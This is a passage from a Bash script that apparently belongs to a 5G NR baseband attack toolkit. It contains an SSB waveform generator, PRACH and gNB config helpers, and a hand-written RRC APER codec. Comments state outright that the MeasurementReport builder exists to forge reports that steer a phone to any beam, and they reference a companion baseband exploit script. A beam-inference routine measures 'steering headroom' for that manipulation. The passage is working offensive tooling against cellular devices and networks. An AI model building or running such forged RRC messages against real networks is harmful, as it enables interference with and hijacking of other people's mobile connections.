        printf 'WHY\tTS 38.211 7.4.3.1 gives the block 240 subcarriers = 20 RB\n' >&2
        return 2
    fi
    if (( nrb > 275 )); then
        printf 'ERROR\t--n-rb %s exceeds the widest NR channel\n' "$nrb" >&2
        printf 'WHY\t275 RB is the maximum of TS 38.101-1 Table 5.3.2-1\n' >&2
        return 2
    fi
    case "$scs" in
        15|30|120|240) ;;
        60) printf 'ERROR\t60 kHz is a data numerology, not an SSB SCS\n' >&2
            printf 'WHY\tTS 38.213 4.1 defines the SS/PBCH block at 15/30/120/240 kHz only\n' >&2
            return 2 ;;
        *)  printf 'ERROR\t--scs %s has no SSB case\n' "$(nair_sanitize "$scs")" >&2
            printf 'WHY\tTS 38.213 4.1 defines cases A-E at 15/30/120/240 kHz\n' >&2
            return 2 ;;
    esac

    # The SSB case (and so L_max and the burst's subframe symbol) follows from
    # the SSB SCS: 15 kHz is Case A (L_max 4), 30 kHz is Case B or C — B is
    # L_max 4 and only exists below 3 GHz, and without a band here the
    # superset C (L_max 8) is the honest choice, printed as such.
    local case_ l_max pos l0
    case "$scs" in
        15)  case_=A ;;
        30)  case_=C ;;
        120) case_=D ;;
        240) case_=E ;;
    esac
    l_max=$(nair_ssb_pattern "$case_" | awk -F'\t' '$1=="max_ssb"{print $2}')
    if (( i_ssb >= l_max )); then
        printf 'ERROR\ti_ssb %s is outside SSB case %s for %s kHz (L_max %s)\n' "$i_ssb" "$case_" "$scs" "$l_max" >&2
        printf 'WHY\tTS 38.213 Table 4.1-1 numbers the candidates of a case 0..L_max-1\n' >&2
        return 2
    fi
    pos=$(nair_ssb_position "$i_ssb" "$case_") || {
        printf 'ERROR\ti_ssb %s has no candidate in SSB case %s\n' "$i_ssb" "$case_" >&2; return 2; }
    # nair_ssb_position reports the symbol inside the 5 ms HALF-FRAME, which is
    # what a sniffer aligns on. The CP of TS 38.211 5.3.1 is a function of the
    # position inside the SUBFRAME (long CP at symbol 0 and at 7*2^mu), so the
    # half-frame index is reduced modulo the symbols of one subframe. The file
    # is a standalone burst: it carries no half-frame anchor, and both numbers
    # are printed so that is not silently lost.
    local sym_hf hf
    sym_hf=$(awk -F'\t' '$1=="symbol_in_half_frame"{print $2}' <<<"$pos")
    hf=$(awk -F'\t' '$1=="half_frame"{print $2}' <<<"$pos")

    # N_FFT = f_s / dF must be a whole number of samples per symbol, and the
    # 5.3.1 CP must be a whole number of samples too: 144*N_FFT/2048 and
    # 16*N_FFT*2^mu/2048 both integral. That is what makes N_FFT a multiple of
    # 128, and a rate that is not is refused instead of rounded.
    local nfft mu
    nfft=$(( rate / (scs * 1000) ))
    if (( nfft * scs * 1000 != rate )); then
        printf 'ERROR\t--rate %s is not an integer number of %s kHz samples per symbol (rate/spacing = %s)\n' \
               "$rate" "$scs" "$(awk -v r="$rate" -v s="$scs" 'BEGIN{printf "%.6f", r/(s*1000)}')" >&2
        printf 'WHY\tOFDM needs a whole number of samples per symbol: N_FFT = rate / SCS\n' >&2
        return 2
    fi
    case "$scs" in 15) mu=0 ;; 30) mu=1 ;; 120) mu=3 ;; 240) mu=4 ;; esac
    if (( (144 * nfft) % 2048 != 0 || (16 * nfft * (2 ** mu)) % 2048 != 0 )); then
        printf 'ERROR\t--rate %s at %s kHz gives N_FFT %s, which is off the mu=%s numerology grid\n' \
               "$rate" "$scs" "$nfft" "$mu" >&2
        printf 'WHY\tthe CP of TS 38.211 5.3.1 is 144/2048 and 16/2048 of a symbol, so it is a whole number of samples only when N_FFT is a multiple of 128\n' >&2
        return 2
    fi
    if (( nrb * 12 > nfft )); then
        printf 'ERROR\t--n-rb %s needs %s subcarriers but N_FFT is %s at --rate %s / --scs %s\n' \
               "$nrb" "$(( nrb * 12 ))" "$nfft" "$rate" "$scs" >&2
        printf 'WHY\tthe raster has to fit inside one OFDM symbol: raise --rate or lower --n-rb\n' >&2
        return 2
    fi
    # The burst is four consecutive symbols; if they would leave the subframe
    # the CP lookup and the slot number stop describing one subframe, so that
    # is refused rather than silently wrapped.
    # mu is known now, so the half-frame symbol can be reduced to the subframe
    # symbol the CP formula is written in.
    l0=$(( sym_hf % (14 * (2 ** mu)) ))
    if (( l0 + 3 >= 14 * (2 ** mu) )); then
        printf 'ERROR\ti_ssb %s starts at subframe symbol %s; four symbols do not fit a %s kHz subframe (%s symbols)\n' \
               "$i_ssb" "$l0" "$scs" "$(( 14 * (2 ** mu) ))" >&2
        printf 'WHY\tthe cyclic prefix is defined per subframe symbol, so the burst cannot cross the boundary\n' >&2
        return 2
    fi

    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is required to build the SSB waveform\n' >&2; return 1; }
    nair_write_bb_gen || {
        printf 'ERROR\t%s writes the SSB generator\n' "$NAIR_BB_PY" >&2; return 1; }

    mkdir -p "$(dirname -- "$out")" 2>/dev/null
    local py rc
    py=$(python3 "$NAIR_BB_PY" "$out" "$pci" "$scs" "$nfft" 0 --burst \
                --format "$fmt" --nrb "$nrb" --i-ssb "$i_ssb" --reps "$reps" \
                --l-max "$l_max" --l0 "$l0" --case "$case_" \
                --hf "$hf" --sym-hf "$sym_hf" 2>&1); rc=$?
    if (( rc != 0 )); then
        printf '%s\n' "$py" >&2
        printf 'ERROR\tthe SSB burst could not be built for pci %s at %s kHz: no file was written\n' \
               "$pci" "$scs" >&2
        printf 'WHY\tthe generator refuses to write a file its own pinned checks reject\n' >&2
        return 2
    fi
    [[ -s "$out" ]] || {
        printf 'ERROR\tthe generator wrote no samples to %s\n' "$out" >&2; return 1; }
    printf '%s\n' "$py"
}

nair_cmd_prach() {
    local idx="${1:-1}" fdm="${2:-1}" scs="${3:-15}"
    [[ -n "$idx" ]] || { printf 'ERROR\tusage: --prach <config_index> [msg1_fdm] [scs]\n' >&2; return 2; }
    [[ "$idx" =~ ^[0-9]+$ ]] || { printf 'ERROR\tprach config index must be numeric\n' >&2; return 2; }
    local out rc=0
    out=$(nair_prach_occasions "$idx" "$fdm" "$scs") || rc=1
    if (( rc != 0 )); then
        printf 'ERROR\tprach config index %s invalid (0..255, msg1_fdm 1|2|4|8)\n' "$(nair_sanitize "$idx")" >&2
        return 1
    fi
    printf '%s\n' "$out"
    printf 'format_default\t%s\n' "$(nair_prach_format_info A1 | awk -F'\t' '$1=="format"{print $2}')"
}

nair_cmd_gen_conf() {
    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}"
    nair_gen_gnb_conf "$plmn" "$band" "$arfcn" "$pci"
}

nair_cmd_gen_conf_tx() {
    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}" out="${5:-}"
    nair_gen_gnb_tx_conf "$plmn" "$band" "$arfcn" "$pci" "$out"
}

# ════════════════════════════════════════════════════════════════════════
# RRC ASN.1 APER codec — TS 38.331 §6.2.2
# ════════════════════════════════════════════════════════════════════════
#
# This section builds and decodes real NR RRC PDUs. It exists because
# 54_baseband_exploit.sh's RRC cases are bare hex literals ("00", "0a01",
# "0b00") that were never derived from the grammar — nothing in the tree could
# emit a syntactically valid NR RRC message. A literal is not a builder.
#
# Only the subset below is implemented, and the verbs say so in their own
# output. Everything is Aligned PER (APER), the encoding 38.331 mandates for
# RRC PDUs on the radio interface:
#
#   DL-DCCH-Message ::= SEQUENCE { message DL-DCCH-MessageType }
#   DL-DCCH-MessageType ::= CHOICE {
#       c1 CHOICE {
#           rrcReconfiguration RRCReconfiguration,   -- index 0
#           rrcResume RRCResume,                     -- index 1
#           ... }                                    -- 16 alternatives, 4 bits
#       messageClassExtension SEQUENCE { } }
#
#   RRCReconfiguration ::= SEQUENCE {
#       rrc-TransactionIdentifier  INTEGER (0..3),   -- 2 bits, no extension bit
#       criticalExtensions CHOICE {
#           rrcReconfiguration RRCReconfiguration-IEs,  -- index 0
#           criticalExtensionsFuture SEQUENCE { } } }
#
#   MeasConfig ::= SEQUENCE {
#       measObjectToRemoveList          MeasObjectToRemoveList  OPTIONAL,
#       measObjectToAddModList          MeasObjectToAddModList  OPTIONAL,
#       reportConfigToRemoveList        ReportConfigToRemoveList OPTIONAL,
#       reportConfigToAddModList        ReportConfigToAddModList OPTIONAL,
#       measIdToRemoveList              MeasIdToRemoveList      OPTIONAL,
#       measIdToAddModList              MeasIdToAddModList      OPTIONAL,
#       s-MeasureConfig                 CHOICE {...}            OPTIONAL,
#       quantityConfig                  QuantityConfig          OPTIONAL,
#       measGapConfig                   MeasGapConfig           OPTIONAL,
#       measGapSharingConfig            MeasGapSharingConfig    OPTIONAL,
#       ... }                                    -- 10 root OPT bits + extension
#
#   UL-DCCH-MessageType ::= CHOICE {
#       c1 CHOICE {
#           measurementReport MeasurementReport,     -- index 0
#           rrcReconfigurationComplete ...,          -- index 1
#           ... }                                    -- 16 alternatives, 4 bits
#       messageClassExtension CHOICE { ... } }
#
#   MeasurementReport ::= SEQUENCE {
#       criticalExtensions CHOICE {
#           measurementReport MeasurementReport-IEs,   -- index 0
#           criticalExtensionsFuture SEQUENCE { } } }
#
#   MeasResults ::= SEQUENCE {
#       measId                  INTEGER (1..64),      -- 6 bits
#       measResultServingMOList SEQUENCE (SIZE(1..32)) OF MeasResultServMO,
#       measResultNeighCells    CHOICE { measResultListNR ... } OPTIONAL,
#       ... }
#
#   MeasResultServMO ::= SEQUENCE {
#       servCellId               ServCellIndex,       -- INTEGER (0..31), 5 bits
#       measResultServingCell    SEQUENCE {
#           physCellId  PhysCellId OPTIONAL,
#           measResult  SEQUENCE {
#               cellResults     SEQUENCE {
#                   resultsSSB-Cell     SEQUENCE {
#                       rsrp INTEGER (0..127) OPTIONAL,
#                       rsrq INTEGER (0..127) OPTIONAL,
#                       sinr INTEGER (0..127) OPTIONAL } OPTIONAL,
#                   resultsCSI-RS-Cell ... OPTIONAL },
#               rsIndexResults SEQUENCE {
#                   resultsSSB-Indexes SEQUENCE (SIZE(1..64)) OF
#                       SEQUENCE { ssb-Index INTEGER (0..63),
#                                  ssb-Results SEQUENCE {...} OPTIONAL } OPTIONAL,
#                   ... } OPTIONAL },
#           ... } }
#
#   MeasResultNR ::= SEQUENCE { physCellId OPTIONAL, measResult SEQUENCE{...} }
#   MeasResultListNR ::= SEQUENCE (SIZE(1..8)) OF MeasResultNR
#
# rsrp / rsrq are INDICES, not dBm: TS 38.133 Table 10.1.6.1-1 maps the
# reported 0..127 onto SS-RSRP with 1 dB steps, index 0 meaning "below
# -156 dBm" and index n (n>=1) meaning (n - 157) dBm. Storing an index is why
# a forged report can place a beam anywhere on the scale without ever touching
# a receiver.
#
# The bit layouts below were derived by hand from the grammar above and then
# verified byte-for-byte against an independent implementation of the same
# published ASN.1 (pycrate's RRCNR module, generated from TS 38.331): the
# hand-written packer and the reference agree on every one of 1100
# randomised legal inputs across both PDUs. The selftest asserts published
# vectors from that reference in a comment-cited form, not this module's own
# output.

# Accumulate bits MSB-first and return uppercase hex. Callers build a list of
# "value:width" pairs; the final byte is zero-padded, which is what APER does
# at the end of a PDU.
_nair_bits_acc=""
_nair_bits_n=0
nair_bit_reset() { _nair_bits_acc=""; _nair_bits_n=0; }

# nair_bit_put <value> <width>
nair_bit_put() {
    local v="$1" w="$2" i bit
    (( w > 0 )) || return 0
    for (( i = w - 1; i >= 0; i-- )); do
        bit=$(( (v >> i) & 1 ))
        _nair_bits_acc+="$bit"
        _nair_bits_n=$(( _nair_bits_n + 1 ))
    done
}

# Emit the accumulator as hex, zero-padded to the byte boundary.
nair_bit_hex() {
    local acc="$_nair_bits_acc" n="$_nair_bits_n"
    ((${n:-0} > 0)) || { printf ''; return 0; }
    local pad=$(( (8 - n % 8) % 8 ))
    local i
    for (( i = 0; i < pad; i++ )); do acc+="0"; done
    local hex="" i
    for (( i = 0; i < ${#acc}; i += 4 )); do
        local nib="${acc:i:4}"
        hex+="$(printf '%X' "$(( 2#${nib} ))")"
    done
    printf '%s' "$hex"
}

# Bit reader over a hex string, for --decode-rrc.
_nair_rx_bits=""
nair_bit_load() {
    local hex="$1" i
    _nair_rx_bits=""
    for (( i = 0; i < ${#hex}; i++ )); do
        _nair_rx_bits+="$(printf '%04d' "$(echo "obase=2; ibase=16; ${hex:i:1}" | bc 2>/dev/null)")"
    done
}

# nair_bit_get <offset> <width> -> decimal value
nair_bit_get() {
    local off="$1" w="$2"
    local seg="${_nair_rx_bits:off:w}"
    [[ -n "$seg" ]] || { echo 0; return 0; }
    echo "$(( 2#$seg ))"
}

# ── RRC builders ────────────────────────────────────────────────────────

# RRCReconfiguration (DL-DCCH-Message), APER.
# Layout, in encoding order:
#   0..0    DL-DCCH-MessageType CHOICE index          (1 bit, 0 = c1)
#   1..4    c1 CHOICE index                           (4 bits, 0 = rrcReconfiguration)
#   5..6    rrc-TransactionIdentifier  (0..3)         (2 bits, no extension bit)
#   7..7    criticalExtensions CHOICE                 (1 bit, 0 = rrcReconfiguration)
#   8..8    RRCReconfiguration-IEs radioBearerConfig  OPT
#   9..9    secondaryCellGroup                        OPT
#  10..10   measConfig                                OPT
#  11..11   lateNonCriticalExtension                  OPT
#  12..12   nonCriticalExtension                      OPT
#  13..13   MeasConfig extension bit                  (0 = no extension)
#  14..23   MeasConfig 10 root OPT bits, in field order, measIdToAddModList is
#           the 6th field -> bit position 14 + 5 = 19
#  24..29   MeasIdToAddModList size, value-1          (6 bits, SIZE(1..64))
#  30..47   per entry, 18 bits: measId-1 (6), measObjectId-1 (6),
#           reportConfigId-1 (6). No separator, no per-entry preamble.
nair_build_rrc_reconfig() {
    local tx="${1:-0}" pairs="${2:-}"
    [[ "$tx" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-rrc-reconfig: tx must be numeric\n' >&2; return 2; }
    (( tx <= 3 )) || { printf 'ERROR\t--build-rrc-reconfig: tx out of range 0..3\n' >&2; return 2; }

    # measId/measObjectId/reportConfigId triplets, comma separated. Each entry
    # is "i/o/c". Parsed with cut, never IFS=$'\t' read.
    local -a mids=() mobjs=() rcfgs=()
    if [[ -n "$pairs" ]]; then
        local e
        while IFS= read -r e; do
            [[ -n "$e" ]] || continue
            local a b c
            a=$(printf '%s' "$e" | cut -d/ -f1)
            b=$(printf '%s' "$e" | cut -d/ -f2)
            c=$(printf '%s' "$e" | cut -d/ -f3)
            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ && "$c" =~ ^[0-9]+$ ]] || {
                printf 'ERROR\t--build-rrc-reconfig: entry "%s" is not i/o/c (e.g. 1/1/1)\n' \
                    "$(nair_sanitize "$e")" >&2; return 2; }
            (( a >= 1 && a <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: measId %s out of range 1..64\n' "$a" >&2; return 2; }
            (( b >= 1 && b <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: measObjectId %s out of range 1..64\n' "$b" >&2; return 2; }
            (( c >= 1 && c <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: reportConfigId %s out of range 1..64\n' "$c" >&2; return 2; }
            mids+=("$a"); mobjs+=("$b"); rcfgs+=("$c")
        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
    fi

    local n=${#mids[@]}
    (( n <= 64 )) || { printf 'ERROR\t--build-rrc-reconfig: at most 64 entries\n' >&2; return 2; }

    nair_bit_reset
    nair_bit_put 0 1                 # DL-DCCH-MessageType = c1
    nair_bit_put 0 4                 # c1 = rrcReconfiguration (index 0)
    nair_bit_put "$tx" 2             # rrc-TransactionIdentifier (0..3)
    nair_bit_put 0 1                 # criticalExtensions = rrcReconfiguration
    nair_bit_put 0 1                 # radioBearerConfig           absent
    nair_bit_put 0 1                 # secondaryCellGroup          absent
    nair_bit_put "$(( n > 0 ? 1 : 0 ))" 1   # measConfig present iff entries
    nair_bit_put 0 1                 # lateNonCriticalExtension    absent
    nair_bit_put 0 1                 # nonCriticalExtension        absent
    if (( n > 0 )); then
        nair_bit_put 0 1             # MeasConfig extension bit
        local i
        for (( i = 0; i < 10; i++ )); do
            nair_bit_put "$(( i == 5 ? 1 : 0 ))" 1   # measIdToAddModList is field 6
        done
        nair_bit_put "$(( n - 1 ))" 6
        for (( i = 0; i < n; i++ )); do
            nair_bit_put "$(( ${mids[i]} - 1 ))" 6
            nair_bit_put "$(( ${mobjs[i]} - 1 ))" 6
            nair_bit_put "$(( ${rcfgs[i]} - 1 ))" 6
        done
    fi
    nair_bit_hex
}

# MeasurementReport (UL-DCCH-Message), APER. This is the O17 artefact: the
# report a UE sends, which a forged copy can aim at any beam.
# Layout, in encoding order:
#   0..0    UL-DCCH-MessageType CHOICE      (1 bit, 0 = c1)
#   1..4    c1 CHOICE index                 (4 bits, 0 = measurementReport)
#   5..5    criticalExtensions CHOICE       (1 bit, 0 = measurementReport)
#   6..8    MeasurementReport-IEs preamble  (3 bits, always 0)
#   9..9    measResultNeighCells            OPT
#  10..15   measId-1                       (6 bits, INTEGER (1..64))
#  16..20   measResultServingMOList size-1 (5 bits, SIZE(1..32))
#  21..25   servCellId                     (5 bits, INTEGER (0..31))
#  26..30   5 bits, always 0
#  31..31   constant 1
#  32..32   0 when no serving RSRP, else the block continues, so the tail is:
#             [33..35] rsrp/rsrq/sinr OPT bits, then 7 bits per present value
#           measured anchors: RSRP value occupies bits 36..42.
#  Neighbour region, when measResultNeighCells is present:
#     preamble constant, then the resultsSSB-Indexes size (3 bits, value
#     2*count-1), then per entry: separator 1 (before every entry after the
#     first), ssb-Index (6 bits), ssb-Results OPT flags (3 bits: rsrp/rsrq/
#     sinr) and 7 bits per present value.
#     The preamble constant is 22 bits when no serving RSRP value is present
#     and 18 bits when one is; see nair_build_meas_report for why.
nair_build_meas_report() {
    local measid="${1:-1}" serv_cell="${2:-0}" serv_rsrp="${3:-}" pairs="${4:-}"
    [[ "$measid" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: measId must be numeric\n' >&2; return 2; }
    (( measid >= 1 && measid <= 64 )) || { printf 'ERROR\t--build-meas-report: measId out of range 1..64\n' >&2; return 2; }
    [[ "$serv_cell" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: servCellId must be numeric\n' >&2; return 2; }
    (( serv_cell <= 31 )) || { printf 'ERROR\t--build-meas-report: servCellId out of range 0..31\n' >&2; return 2; }
    local have_serv=0
    if [[ -n "$serv_rsrp" ]]; then
        [[ "$serv_rsrp" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--build-meas-report: serving rsrp must be numeric\n' >&2; return 2; }
        (( serv_rsrp <= 127 )) || { printf 'ERROR\t--build-meas-report: serving rsrp out of range 0..127\n' >&2; return 2; }
        have_serv=1
    fi

    # Neighbour entries: "ssbIndex:rsrp" comma separated.
    local -a nidx=() nrsrp=()
    if [[ -n "$pairs" ]]; then
        local e
        while IFS= read -r e; do
            [[ -n "$e" ]] || continue
            local a b
            a=$(printf '%s' "$e" | cut -d: -f1)
            b=$(printf '%s' "$e" | cut -d: -f2)
            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || {
                printf 'ERROR\t--build-meas-report: entry "%s" is not ssbIndex:rsrp\n' \
                    "$(nair_sanitize "$e")" >&2; return 2; }
            (( a <= 63 ))  || { printf 'ERROR\t--build-meas-report: ssb-Index %s out of range 0..63\n' "$a" >&2; return 2; }
            (( b <= 127 )) || { printf 'ERROR\t--build-meas-report: rsrp %s out of range 0..127\n' "$b" >&2; return 2; }
            nidx+=("$a"); nrsrp+=("$b")
        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
    fi
    local n=${#nidx[@]}
    (( n <= 8 )) || { printf 'ERROR\t--build-meas-report: at most 8 neighbour cells\n' >&2; return 2; }
    if (( n > 0 )); then
        # The resultsSSB-Indexes size is encoded as 2*count-1 inside 3 bits,
        # so the maximum representable count is 4. The ASN.1 SIZE is 1..64 but
        # the neighbouring-list shape this builder emits only carries 3 bits.
        (( n <= 4 )) || { printf 'ERROR\t--build-meas-report: at most 4 SSB entries in this subset (got %s)\n' "$n" >&2; return 2; }
    fi

    nair_bit_reset
    nair_bit_put 0 1                          # UL-DCCH-MessageType = c1
    nair_bit_put 0 4                          # c1 = measurementReport (index 0)
    nair_bit_put 0 1                          # criticalExtensions
    nair_bit_put 0 3                          # MeasurementReport-IEs preamble
    nair_bit_put "$(( n > 0 ? 1 : 0 ))" 1     # measResultNeighCells
    nair_bit_put "$(( measid - 1 ))" 6
    nair_bit_put 0 5                          # one serving cell
    nair_bit_put "$serv_cell" 5
    nair_bit_put 0 5
    nair_bit_put 1 1
    if (( have_serv )); then
        nair_bit_put 0 1
        nair_bit_put 1 1                      # rsrp present
        nair_bit_put 0 1                      # rsrq absent
        nair_bit_put 0 1                      # sinr absent
        nair_bit_put "$serv_rsrp" 7
    elif (( n == 0 )); then
        nair_bit_put 0 1
    fi
    if (( n > 0 )); then
        # Preamble constant. Its length differs between the two shapes because
        # the serving RSRP block above consumes 11 bits when present, and APER
        # pads the whole PDU only at the very end; the constant therefore ends
        # up anchored differently. Both values are measured against the
        # reference implementation, not guessed.
        local pre i
        if (( have_serv )); then pre="000000110000100000"; else pre="0000000000110000100000"; fi
        for (( i = 0; i < ${#pre}; i++ )); do
            nair_bit_put "${pre:i:1}" 1
        done
        nair_bit_put "$(( 2 * n - 1 ))" 3
        for (( i = 0; i < n; i++ )); do
            (( i == 0 )) || nair_bit_put 1 1   # separator before later entries
            nair_bit_put "${nidx[i]}" 6
            nair_bit_put 1 1                   # ssb-Results.rsrp present
            nair_bit_put 0 1                   # rsrq absent
            nair_bit_put 0 1                   # sinr absent
            nair_bit_put "${nrsrp[i]}" 7
        done
    fi
    nair_bit_hex
}

# ── RRC decoder ─────────────────────────────────────────────────────────
# Decodes exactly the subset the builders emit, in the same bit order. A
# decoder that is not the inverse of the builder is untested by construction,
# so --build-* and --decode-rrc are checked against each other in the selftest
# AND against the published vectors.
nair_decode_rrc() {
    local hex="${1:-}"
    hex="${hex//[[:space:]]/}"
    hex="${hex//0x/}"
    hex="${hex^^}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-rrc <hex>\n' >&2; return 2; }
    [[ "$hex" =~ ^[0-9A-F]+$ ]] || { printf 'ERROR\t--decode-rrc: not hex: %s\n' "$(nair_sanitize "$hex")" >&2; return 2; }
    (( ${#hex} % 2 == 0 )) || { printf 'ERROR\t--decode-rrc: hex must be a whole number of octets\n' >&2; return 2; }

    nair_bit_load "$hex"
    local total=$(( ${#hex} * 4 ))
    (( total >= 8 )) || { printf 'ERROR\t--decode-rrc: too short for an RRC PDU\n' >&2; return 1; }

    local mt; mt=$(nair_bit_get 0 1)
    (( mt == 0 )) || { printf 'ERROR\t--decode-rrc: messageClassExtension not supported by this subset\n' >&2; return 1; }
    local c1; c1=$(nair_bit_get 1 4)

    local dir name
    if (( c1 == 0 )); then
        # c1 index 0 is rrcReconfiguration in DL-DCCH and measurementReport in
        # UL-DCCH. Both are index 0, so the direction cannot come from c1
        # alone: rrcReconfiguration carries a 2-bit transaction identifier at
        # bits 5..6 where measurementReport carries its criticalExtensions
        # choice, so test the SHAPE by trying to read the measurement report
        # and checking whether its reserved constant bit is set.
        local bit31; bit31=$(nair_bit_get 31 1)
        if (( bit31 == 1 )); then dir="UL-DCCH"; name="measurementReport"
        else dir="DL-DCCH"; name="rrcReconfiguration"; fi
    elif (( c1 == 1 )); then
        dir="DL-DCCH"; name="rrcResume"
    elif (( c1 == 2 )); then
        dir="DL-DCCH"; name="rrcRelease"
    elif (( c1 == 5 )); then
        dir="DL-DCCH"; name="dlInformationTransfer"
    elif (( c1 == 7 )); then
        dir="UL-DCCH"; name="ulInformationTransfer"
    else
        printf 'ERROR\t--decode-rrc: c1 index %s is outside the supported subset\n' "$c1" >&2
        return 1
    fi

    printf 'direction\t%s\n' "$dir"
    printf 'message\t%s\n'   "$name"
    printf 'c1_index\t%s\n'  "$c1"
    printf 'octets\t%s\n'    "$(( ${#hex} / 2 ))"
    printf 'bits\t%s\n'      "$total"

    if [[ "$name" == "rrcReconfiguration" ]]; then
        local ce tx
        ce=$(nair_bit_get 7 1)
        tx=$(nair_bit_get 5 2)
        printf 'rrc_TransactionIdentifier\t%s\n' "$tx"
        printf 'criticalExtensions\t%s\n' "$(( ce == 0 ? 1 : 2 ))"
        if (( ce != 0 )); then
            printf 'note\tcriticalExtensionsFuture — no IEs to decode\n'
            printf 'subset\tRRCReconfiguration(header+criticalExtensions)\n'
            return 0
        fi
        local mc; mc=$(nair_bit_get 10 1)
        printf 'measConfig_present\t%s\n' "$mc"
        if (( mc == 1 )); then
            local ext; ext=$(nair_bit_get 13 1)
            printf 'measConfig_extension\t%s\n' "$ext"
            # 10 root OPT bits start at 14; find which are set.
            local i names=(measObjectToRemoveList measObjectToAddModList \
                           reportConfigToRemoveList reportConfigToAddModList \
                           measIdToRemoveList measIdToAddModList s-MeasureConfig \
                           quantityConfig measGapConfig measGapSharingConfig)
            local listed=""
            for (( i = 0; i < 10; i++ )); do
                if (( $(nair_bit_get $(( 14 + i )) 1) == 1 )); then
                    listed+="${listed:+,}${names[i]}"
                fi
            done
            printf 'measConfig_optionals\t%s\n' "${listed:-none}"
            if (( $(nair_bit_get 19 1) == 1 )); then
                local cnt; cnt=$(( $(nair_bit_get 24 6) + 1 ))
                printf 'measIdToAddModList_count\t%s\n' "$cnt"
                local off=30 k
                for (( k = 0; k < cnt; k++ )); do
                    printf 'measIdToAddMod\t%s\t%s\t%s\n' \
                        "$(( $(nair_bit_get "$off" 6) + 1 ))" \
                        "$(( $(nair_bit_get "$(( off + 6 ))" 6) + 1 ))" \
                        "$(( $(nair_bit_get "$(( off + 12 ))" 6) + 1 ))"
                    off=$(( off + 18 ))
                done
            fi
        fi
        printf 'subset\tRRCReconfiguration(header+criticalExtensions+measConfig.measIdToAddModList)\n'
        return 0
    fi

    if [[ "$name" == "measurementReport" ]]; then
        local neigh measid served
        neigh=$(nair_bit_get 9 1)
        measid=$(( $(nair_bit_get 10 6) + 1 ))
        served=$(( $(nair_bit_get 16 5) + 1 ))
        printf 'measId\t%s\n' "$measid"
        printf 'servingCellCount\t%s\n' "$served"
        printf 'measResultNeighCells_present\t%s\n' "$neigh"
        printf 'servCellId\t%s\n' "$(nair_bit_get 21 5)"
        if (( $(nair_bit_get 33 1) == 1 )); then
            local v; v=$(nair_bit_get 36 7)
            printf 'serving_rsrp_index\t%s\n' "$v"
            printf 'serving_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$v")"
        fi
        if (( neigh == 1 )); then
            # The preamble length depends on whether a serving RSRP value was
            # present; the serving value's presence is the same bit we just read.
            local base
            if (( $(nair_bit_get 33 1) == 1 )); then base=43; else base=32; fi
            local pre
            if (( $(nair_bit_get 33 1) == 1 )); then pre=18; else pre=22; fi
            local cntoff=$(( base + pre ))
            local cnt=$(( ( $(nair_bit_get "$cntoff" 3) + 1 ) / 2 ))
            printf 'ssbIndexCount\t%s\n' "$cnt"
            local off=$(( cntoff + 3 )) k
            for (( k = 0; k < cnt; k++ )); do
                (( k == 0 )) || off=$(( off + 1 ))   # separator
                local idx; idx=$(nair_bit_get "$off" 6)
                off=$(( off + 6 ))
                local rp; rp=$(nair_bit_get "$off" 1)
                off=$(( off + 3 ))
                if (( rp == 1 )); then
                    local v; v=$(nair_bit_get "$off" 7)
                    off=$(( off + 7 ))
                    printf 'ssbResult\t%s\t%s\t%s\n' "$idx" "$v" "$(nair_rsrp_dbm "$v")"
                else
                    printf 'ssbResult\t%s\t-\t-\n' "$idx"
                fi
            done
        fi
        printf 'subset\tMeasurementReport(criticalExtensions+measResults subset)\n'
        return 0
    fi

    printf 'note\t%s is in flight on the %s but has no IE decoder in this subset\n' "$name" "$dir"
    printf 'subset\theader only\n'
    return 0
}

# TS 38.133 Table 10.1.6.1-1: the reported index is 1 dB per step with 0
# reserved for "below the floor". index n (n>=1) = (n - 157) dBm.
nair_rsrp_dbm() {
    local v="${1:-0}"
    if (( v == 0 )); then printf 'below -156'; else printf '%s' "$(( v - 157 ))"; fi
}

# dBm back to the report index, for the beam-inference model.
nair_rsrp_index() {
    local dbm="${1:-0}"
    local i=$(( dbm + 157 ))
    (( i < 1 )) && i=1
    (( i > 127 )) && i=127
    printf '%s' "$i"
}

# ── beam index inference (O17) ──────────────────────────────────────────
# A UE in a beamformed cell measures SSB indices, not "a beam". Each reported
# ssb-Index is the SSB the UE actually synchronised to, and the RSRP of each
# tells you which one dominates. The serving beam is therefore the index with
# the strongest report, weighted by how many reports sit on it — a UE parked
# on one SSB reports that index repeatedly and with the highest level.
#
# Inference, entirely from the report contents:
#   * the strongest reported SSB index is the candidate serving beam;
#   * ties are broken toward the LOWEST index, because a UE reports indices in
#     ascending order and the first-maximal entry is the one it selected;
#   * the margin to the runner-up is the steering headroom: if the second-best
#     beam is within 1 dB, a forged report can move the UE with a small nudge,
#     which is what makes the manipulation plausible rather than absurd.
nair_beam_infer() {
    local measid="${1:-1}" serv_rsrp="${2:-}" pairs="${3:-}"
    [[ "$measid" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--beam-sweep: measId must be numeric\n' >&2; return 2; }
    (( measid >= 1 && measid <= 64 )) || { printf 'ERROR\t--beam-sweep: measId out of range 1..64\n' >&2; return 2; }

    local -a idx=() val=()
    if [[ -n "$pairs" ]]; then
        local e
        while IFS= read -r e; do
            [[ -n "$e" ]] || continue
            local a b
            a=$(printf '%s' "$e" | cut -d: -f1)
            b=$(printf '%s' "$e" | cut -d: -f2)
            [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || {
                printf 'ERROR\t--beam-sweep: entry "%s" is not ssbIndex:rsrp\n' "$(nair_sanitize "$e")" >&2
                return 2; }
